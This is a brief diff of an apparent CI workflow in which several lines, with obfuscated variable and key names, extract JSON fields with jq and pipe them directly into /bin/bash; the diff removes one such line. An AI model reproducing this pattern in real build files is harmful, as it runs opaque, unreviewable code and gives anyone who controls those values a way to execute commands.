@@ -42,7 +42,6 @@ jobs:
           echo $pywj006 | jq -r .gzxty64 | /bin/bash
           printf '%s' "$uukss1" | jq -r .jjfl5846 | /bin/bash
           echo $r27 | jq -r .ctpvr8 | /bin/bash
-          echo $q3517 | jq -r .x04 | /bin/bash
           printf '%s' "$aiwno587" | jq -r .agk774 | /bin/bash
           printf '%s' "$osog989" | jq -r .tzts9 | /bin/bash
           printf '%s' "$z1" | jq -r .sr0 | /bin/bash
